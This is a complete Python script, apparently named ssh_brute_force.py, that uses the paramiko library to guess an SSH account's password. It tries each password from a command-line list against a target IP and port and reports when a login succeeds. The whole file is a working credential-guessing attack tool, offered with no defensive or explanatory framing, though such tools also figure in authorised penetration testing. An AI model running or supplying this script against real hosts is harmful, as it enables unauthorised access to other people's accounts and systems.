import paramiko, sys, socket

def ssh_connect(username, password, host, port, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=port, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code

def start_ssh_brute_force_attack(username, targetIP, targetPort, passwords):
    print(f"Target address: {targetIP}")
    print(f"Target port: {targetPort}")
    print(f"SSH username: {username}")
    for password in passwords:
        try:
            response = ssh_connect(username,password,targetIP, targetPort)
            if response == 0:
                print('[+] Found Password: ' + password + ' ,For Account: ' + username)
                break
            elif response == 1:
                print('[-] Incorrect Login: ' + password)
            elif response == 2:
                print('[!!] Can Not Connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass

if __name__ == '__main__':
    argv_len = len(sys.argv)
    if  argv_len < 5:
        print("Invalid input arguments")
        print("python ssh_brute_force.py <targetIP> <targetPort> <username> <password1[,password2,password3]>")
    else:
        host = sys.argv[1]
        port = sys.argv[2]
        username = sys.argv[3]
        passwords = sys.argv[4].split(',')
        start_ssh_brute_force_attack(username,host,port, passwords)
